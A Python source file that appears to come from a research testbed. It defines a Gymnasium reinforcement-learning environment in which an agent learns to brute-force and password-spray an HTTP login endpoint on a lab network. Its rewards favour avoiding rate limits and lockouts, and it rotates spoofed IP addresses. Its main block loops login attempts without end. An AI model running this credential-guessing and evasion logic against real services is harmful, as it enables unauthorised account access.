#import gymnasium as gym
from gymnasium import spaces
import gymnasium
import numpy as np
from Agent_BF_Env3 import IH3Agent
from HTTP import HTTPQuery
import threading
import SharedMemLib
import random
import time
from enum import Enum
import requests
from gymnasium.envs.registration import register

register(
    id='BruteForceEnv-v0',
    entry_point='BF_GymEnv:BruteForceEnv',
#    kwargs={'user_file': user_file, 'password_file': password_file, 'delimiter': delimiter, 'http_query': http_query_APP2}
)

class ErrorMessages(Enum):
    NO_ERROR = 0
    RATE_LIMIT = 1
    FORBIDDEN = 2
    BLOCKED = 3
    OTHER = 4

class BruteForceEnv(gymnasium.Env):
    metadata = {}
    def __init__(self, users, passwords, indexPass_map, max_num_steps=1000, http_query=None, agentId:int = 0):
        super(BruteForceEnv, self).__init__()
        self.agentId = agentId
        # Control variables
        self.done = False
        self.lock = threading.Lock()
        self.lock2 = threading.Lock()

        # ML variables
        self.episode_reward = 0
        self.maxEpisodeSteps = max_num_steps
        self.maxEpisodeSteps_const = max_num_steps
        self.start_time = time.time()
        # Agent variables
        self.PasswordSpray = False
        self.users = users
        self.passwords = passwords
        self.indexUsrs = 0
        self.indexPass_map = indexPass_map
        self.undetected_attempt_count = 0
        self.current_step = 0
        #self.total_attempt_count = 0
        self.last_action_time = time.time()
        self.action_2_time = 0  # Record the time in milliseconds
        self.dummy_ips = ["192.168.1.1", "192.168.1.50", "192.168.1.51", "192.168.1.52", "192.168.1.53"]
        self.ip_counter = 0
        self.ip = "0.0.0.0"
        #self.http_query = HTTPQuery(
        #    host="http://192.168.16.147:8081",
        #    default_headers={"Content-Type": "application/x-www-form-urlencoded"},
        #    post_query="username=${USER}&password=${PASS}",
        #    path="/login",
        #    use_post=True,
        #    use_json=False
        #)
        self.http_query = http_query if http_query else HTTPQuery(
            host="http://192.168.16.147:8082",
            path="/login",
            use_post=True,
            use_json=True
        )
        # Q-learning parameters
        #NumStates = 1000, NumActions = 5

        self.time_penalty = 0

         # Define the observation space
        self.observation_space = spaces.Dict({
            'attempted_passwords_this_user': spaces.Discrete(100000),  # 0-10
            'num_attempts': spaces.Discrete(100000),  # Arbitrary large number
            'elapsed_time': spaces.Discrete(1000),  # Arbitrary large number in deciseconds
            'total_time': spaces.Discrete(100),  # in minutes
            'error_messages': spaces.Discrete(11),  # 0-10
            'rate_limiting': spaces.Discrete(2),  # 0-1
            'lockout_status': spaces.Discrete(2),  # 0-1
            #'success_rate': spaces.Box(low=0.0, high=1.0, shape=()),  # 0-1
            #'patterns': spaces.Dict({
            'password_spray': spaces.Discrete(2),  # True, False
            #}),
            'total_locks': spaces.Discrete(1000)  # Arbitrary large number
        })
        # Define the action space
        self.action_space = spaces.Discrete(5)  # 5 sets of actions

        # Initialize the state
        self.state = {
            'attempted_passwords_this_user': 0,
            'num_attempts': 0,
            'elapsed_time': 0,
            'total_time': 0,
            'error_messages': ErrorMessages.NO_ERROR.value,
            'rate_limiting': 0,
            'lockout_status': 0,
            #'success_rate': 0.0,
            #'patterns': {'password_spray': 0},
            'password_spray': 0,
            'total_locks': 0
        }



    def get_next_pair(self):
        with self.lock:
            #Check when all lists are exhausted
            i = len(self.users)
            while self.indexUsrs < len(self.users) and i > 0:
                i -= 1
                if(self.indexPass_map[self.indexUsrs] < len(self.passwords)):
                    break
                self.indexUsrs += 1
                if self.indexUsrs >= len(self.users):
                    self.indexUsrs = 0
            
            if(self.indexUsrs == len(self.users) or self.indexPass_map[self.indexUsrs] >= len(self.passwords)) or i==0:
                return None, None

            if not self.PasswordSpray:
                item1 = self.users[self.indexUsrs]
                item2 = self.passwords[self.indexPass_map[self.indexUsrs]]
                self.indexPass_map[self.indexUsrs] += 1
                if self.indexPass_map[self.indexUsrs] >= len(self.passwords):
                    self.indexUsrs += 1
            else:
                item1 = self.users[self.indexUsrs]    
                item2 = self.passwords[self.indexPass_map[self.indexUsrs]]
                self.indexPass_map[self.indexUsrs] += 1
                self.indexUsrs += 1
                if self.indexUsrs >= len(self.users):
                    self.indexUsrs = 0
                    #self.indexPass_map[self.indexUsrs] += 1

            #self.total_attempt_count += 1
            return item1, item2
    def reset(self, seed=None, options=None):
        super().reset()
        self.maxEpisodeSteps = self.maxEpisodeSteps_const
        print("State before reset: ", self.episode_reward, " - ", self.state)
        # Call the API to restart the database
        if self.http_query.host.endswith("8082"):
            response = requests.get('http://192.168.16.146:81/restart-database/2')
        else:
            response = requests.get('http://192.168.16.146:81/restart-database/1')

        if response.status_code != 200:
            print(f"Failed to restart the database: {response.status_code}")
        
        # Reset the state to the initial state
        with self.lock:
            self.state = {
                'attempted_passwords_this_user': 0,
                'num_attempts': 0,
                'elapsed_time': 0,
                'total_time': 0,
                'error_messages': ErrorMessages.NO_ERROR.value,
                'rate_limiting': 0,
                'lockout_status': 0,
                #'success_rate': 0.0,
                #'patterns': {'password_spray': 0},
                'password_spray': 0,
                'total_locks': 0
            }
        random.shuffle(self.users)
        self.start_time = time.time()
        self.current_step = 0
        self.done = False
        self.indexPass_map = {i: 0 for i in range(len(self.users))}
        #print("Reset Done: ", self.state)
        return self._get_observation(), {}

    def _get_observation(self):
        # Convert the state dictionary to a numpy structured array
        # Convert the state dictionary to a dictionary of integers
        ret_val = {key: int(value) for key, value in self.state.items()}
        #ret_val = {key: np.array([value]) for key, value in self.state.items()}
        return ret_val

    def dynamic_timeout(self):
        #print("Dynamic timeout")
        success_rate = (
            self.undetected_attempt_count / self.state['num_attempts']
            if self.state['num_attempts'] > 0
            else 0
        )
        #TODO: change the lockout probability and time penalty based on the success of the attack over the blocked user
        if success_rate < 0.5:
            self.time_penalty = min(self.time_penalty + 1, 4)
        else:
            self.time_penalty = max(self.time_penalty - 1, 0)
    def change_traversal(self):
        with self.lock:
            self.PasswordSpray = not self.PasswordSpray

    def determine_reward_from_response(self, success, status_code, response_text):
        #print(f"Status Code: {status_code}")
        reward = 0
        self.state['error_messages'] = ErrorMessages.OTHER.value
        if "rate limit" in response_text.lower() or "too many requests" in response_text.lower():
            reward -= 5
            self.state['error_messages'] = ErrorMessages.RATE_LIMIT.value
            self.state['rate_limiting'] = 1
        
        #Default mod_security resopnse
        if "forbidden" in response_text.lower():
            self.state['error_messages'] = ErrorMessages.FORBIDDEN.value
            #reward -= 15 you'll get this anyways
        
        elif status_code == 403 or "blocked" in response_text.lower():
            #reward -= 10
            reward -= 1
            print("Lockout detected (403).")
            self.state['error_messages'] = ErrorMessages.BLOCKED.value
            self.state['lockout_status'] = 1
            self.state['total_locks'] += 1
            time.sleep(self.time_penalty)
        
        elif success or status_code == 401:
            self.state['error_messages'] = ErrorMessages.NO_ERROR.value
            reward += 0.1
        return reward

    def read_write_sharedMem(self):
        #print("Reading from shared memory")
        message = SharedMemLib.read_write_sharedMem(SharedMemLib.Mode.READ, agentId=self.agentId)
        reward = 0
        if message:
            reward -= 15
        
        return reward
    
    def step(self, action):
        #print("Step: ", action)
        reward = 0
        self.maxEpisodeSteps -= 1
        # reset lockout status
        self.state['lockout_status'] = 0
        #done = False

        self.dynamic_timeout()
        #self.ActualActionArray.append(action)
        #print(f"Action: {action}")
        if action == 0:
            #print("Action: Wait")
            #time.sleep(self.time_penalty)
            # Cycle through dummy IP addresses if changeIP is True
            self.ip = self.dummy_ips[self.ip_counter]
            self.ip_counter = (self.ip_counter + 1) % len(self.dummy_ips)
            reward -= 0.1
        
        elif action == 1:
            #print("Action: Skip user")
            with self.lock:
                if self.indexUsrs < len(self.users):
                    self.users.append(self.users.pop(self.indexUsrs))
            reward -= 0.1
            #self.indexUsrs += 1
        elif action == 2:
            self.last_action_time = time.time()
            #print("Action: Try next password")
            username, password = self.get_next_pair()
            if(username is None or password is None):
                self.done = True
                print("All username-password pairs exhausted.")
                
                return self.state, reward + 50000, self.done, False,{}
            with self.lock2:
                success, status_code, response_text = self.http_query.perform_query(
                    username=username,
                    password=password,
                    search_string="Welcome",
                    ip=self.ip,
                )
            reward += self.determine_reward_from_response(success, status_code, response_text)

            self.state['num_attempts'] += 1
            #self.total_attempt_count += 1
            if success:
                reward += 50000
                self.done = True
                print("Login successful!")
            else:
                #reward += 1
                self.undetected_attempt_count += 1
                #if 50 attempts are made, then reward += 5
                if self.state['num_attempts'] % 25 == 0:
                    reward += 5
                #print(f"Attempt failed without lockout. {self.undetected_attempt_count} undetected attempts.")
            self.action_2_time = time.time() * 1000  # Record the time in milliseconds

        elif action == 3:
            #print("Action: Toggle brute force and password spray")
            self.change_traversal()
            reward -= 0.1
        elif action == 4:
            with self.lock2:
                time.sleep(self.time_penalty)
            reward -= 1.2
        #print(time.time() - self.last_action_time)
        if time.time() - self.last_action_time > 10:
            reward -= 20
        #todo: read from shared memory, if there's a message, then reward -= 15
        reward += self.read_write_sharedMem()

        current_time = time.time() * 1000  # Current time in milliseconds
        
        self.state['elapsed_time'] = int(current_time - self.action_2_time)/10 if self.action_2_time > 0 else 0
        if(self.state['elapsed_time'] >= 1000):
            self.state['elapsed_time'] = 999

        #self.state['elapsed_time'] = elapsed_time

        if self.state['elapsed_time'] > 100:
            reward -= 1

        #state_idx = self.state_to_index(self.state)
        #next_state_idx = self.state_to_index(self.default_state())
        #best_next_action = np.argmax(self.q_table[next_state_idx])
        #self.q_table[state_idx, action] += self.alpha * (
        #    reward + self.gamma * self.q_table[next_state_idx, best_next_action]
        #    - self.q_table[state_idx, action]
        #)

        #self.state['success_rate'] = self.undetected_attempt_count / self.state['num_attempts']
        #self.state['patterns']['password_spray'] = self.PasswordSpray
        self.state['password_spray'] = self.PasswordSpray
        #self.state['elapsed_time'] += 1
        self.state['total_time'] = (time.time() - self.start_time) / 60  # Update total_time in minutes
        if(self.state['num_attempts'] >= 100000):
            self.state['num_attempts'] = 99999
        #self.state['total_locks'] = self.time_penalty
        #self.state['error_messages'] = 0
        #self.state['rate_limiting'] = 0
        #self.state['lockout_status'] = 0

        self.state['attempted_passwords_this_user'] = int(self.indexPass_map[self.indexUsrs]) if self.indexUsrs in self.indexPass_map else 0
        if(self.state['attempted_passwords_this_user'] >= 100000):
            self.state['attempted_passwords_this_user'] = 99999
        #self.state['num_attempts'] = self.total_attempt_count
        
        #self.state = (self.query_count, self.PasswordSpray)
        #print(f"New state: {self.state}, Reward: {reward}, Done: {self.done}")
        self.current_step += 1
        if self.current_step >= self.maxEpisodeSteps:
            self.done = True

        self.episode_reward += reward
        return self._get_observation(), reward, self.done, False, {}

    def render(self, mode='human'):
        # Implement rendering logic if needed
        pass

    def close(self):
        # Implement any cleanup logic if needed
        pass

# Example usage
if __name__ == "__main__":
    agent = IH3Agent()
    env = BruteForceEnv(users=agent.users, passwords=agent.passwords, indexPass_map=agent.indexPass_map, http_query=agent.http_query_APP3, agentId=1)
    while True:
        env.step(2);
    state = env.reset()
    print("Initial state:", state)
    action = env.action_space.sample()
    next_state, reward, done, info = env.step(action)
    print("Next state:", next_state, "Reward:", reward, "Done:", done)